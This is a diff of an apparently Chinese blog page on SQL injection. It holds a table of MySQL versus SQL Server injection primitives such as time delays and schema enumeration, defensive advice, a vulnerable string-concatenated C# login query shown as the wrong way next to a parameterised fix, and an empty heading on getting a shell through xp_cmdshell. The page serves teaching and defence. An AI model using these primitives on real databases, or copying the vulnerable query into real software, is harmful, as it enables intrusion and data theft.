-| 当前用户 | `user()` | `SYSTEM_USER`、`SUSER_SNAME()` |
-| 版本信息 | `version()` | `@@version` |
-| 字符串长度 | `length()` | `len()` |
-| 截取字符串 | `substr()`、`substring()` | `substring()` |
-| ASCII | `ascii()` | `ascii()` |
-| 字符串拼接 | `concat()` | `+`、`concat()` |
-| 限制行数 | `limit 0,1` | `top 1`、`offset fetch` |
-| 延时 | `sleep(5)` | `waitfor delay '0:0:5'` |
-| 表信息 | `information_schema.tables` | `sys.tables`、`information_schema.tables` |
-| 列信息 | `information_schema.columns` | `sys.columns`、`information_schema.columns` |
-| 字符串聚合 | `group_concat()` | `string_agg()` |
-
-## 7. 防护建议
-
-1. 使用参数化查询或 ORM 参数绑定，禁止字符串拼接 SQL。
-
-2. 对数字、枚举、排序字段进行白名单校验。
-
-3. 数据库账号使用最小权限，不给业务账号 `db_owner`、`sysadmin`。
-
-4. 关闭详细错误回显，统一返回通用错误页面。
-
-5. 禁用高危扩展功能，例如 `xp_cmdshell`、OLE Automation。
-
-6. 对登录、搜索、详情页等入口增加安全测试用例。
-
-7. 使用 WAF、审计日志和异常 SQL 监控作为补充防线。
-
-## 8. 参数化查询示例
-
-错误写法：
-
+<h2 id="6-MySQL-与-SQL-Server-注入差异"><a href="#6-MySQL-与-SQL-Server-注入差异" class="headerlink" title="6. MySQL 与 SQL Server 注入差异"></a>6. MySQL 与 SQL Server 注入差异</h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>MySQL</th>
+<th>SQL Server</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单行注释</td>
+<td><code>#</code>、<code>-- </code></td>
+<td><code>-- </code></td>
+</tr>
+<tr>
+<td>当前数据库</td>
+<td><code>database()</code></td>
+<td><code>DB_NAME()</code></td>
+</tr>
+<tr>
+<td>当前用户</td>
+<td><code>user()</code></td>
+<td><code>SYSTEM_USER</code>、<code>SUSER_SNAME()</code></td>
+</tr>
+<tr>
+<td>版本信息</td>
+<td><code>version()</code></td>
+<td><code>@@version</code></td>
+</tr>
+<tr>
+<td>字符串长度</td>
+<td><code>length()</code></td>
+<td><code>len()</code></td>
+</tr>
+<tr>
+<td>截取字符串</td>
+<td><code>substr()</code>、<code>substring()</code></td>
+<td><code>substring()</code></td>
+</tr>
+<tr>
+<td>ASCII</td>
+<td><code>ascii()</code></td>
+<td><code>ascii()</code></td>
+</tr>
+<tr>
+<td>字符串拼接</td>
+<td><code>concat()</code></td>
+<td><code>+</code>、<code>concat()</code></td>
+</tr>
+<tr>
+<td>限制行数</td>
+<td><code>limit 0,1</code></td>
+<td><code>top 1</code>、<code>offset fetch</code></td>
+</tr>
+<tr>
+<td>延时</td>
+<td><code>sleep(5)</code></td>
+<td><code>waitfor delay &#39;0:0:5&#39;</code></td>
+</tr>
+<tr>
+<td>表信息</td>
+<td><code>information_schema.tables</code></td>
+<td><code>sys.tables</code>、<code>information_schema.tables</code></td>
+</tr>
+<tr>
+<td>列信息</td>
+<td><code>information_schema.columns</code></td>
+<td><code>sys.columns</code>、<code>information_schema.columns</code></td>
+</tr>
+<tr>
+<td>字符串聚合</td>
+<td><code>group_concat()</code></td>
+<td><code>string_agg()</code></td>
+</tr>
+</tbody></table>
+<h2 id="7-防护建议"><a href="#7-防护建议" class="headerlink" title="7. 防护建议"></a>7. 防护建议</h2><ol>
+<li><p>使用参数化查询或 ORM 参数绑定，禁止字符串拼接 SQL。</p>
+</li>
+<li><p>对数字、枚举、排序字段进行白名单校验。</p>
+</li>
+<li><p>数据库账号使用最小权限，不给业务账号 <code>db_owner</code>、<code>sysadmin</code>。</p>
+</li>
+<li><p>关闭详细错误回显，统一返回通用错误页面。</p>
+</li>
+<li><p>禁用高危扩展功能，例如 <code>xp_cmdshell</code>、OLE Automation。</p>
+</li>
+<li><p>对登录、搜索、详情页等入口增加安全测试用例。</p>
+</li>
+<li><p>使用 WAF、审计日志和异常 SQL 监控作为补充防线。</p>
+</li>
+</ol>
+<h2 id="8-参数化查询示例"><a href="#8-参数化查询示例" class="headerlink" title="8. 参数化查询示例"></a>8. 参数化查询示例</h2><p>错误写法：</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> sql = <span class="string">&quot;select * from users where username=&#x27;&quot;</span> + username + <span class="string">&quot;&#x27; and password=&#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-正确写法：
-
+<p>正确写法：</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">var</span> cmd = <span class="keyword">new</span> SqlCommand(</span><br><span class="line">    <span class="string">&quot;select * from users where username=@username and password=@password&quot;</span>,</span><br><span class="line">    conn</span><br><span class="line">);</span><br><span class="line">cmd.Parameters.AddWithValue(<span class="string">&quot;@username&quot;</span>, username);</span><br><span class="line">cmd.Parameters.AddWithValue(<span class="string">&quot;@password&quot;</span>, password);</span><br></pre></td></tr></table></figure>
 
-核心思路：让用户输入只作为数据传入，而不是作为 SQL 语法的一部分执行。
-
-## 利用方式
-
-### SA权限开启xp_cmdshell getshell
-
-
-
-
-
+<p>核心思路：让用户输入只作为数据传入，而不是作为 SQL 语法的一部分执行。</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="SA权限开启xp-cmdshell-getshell"><a href="#SA权限开启xp-cmdshell-getshell" class="headerlink" title="SA权限开启xp_cmdshell getshell"></a>SA权限开启xp_cmdshell getshell</h3>
   </div>
 </article>
 
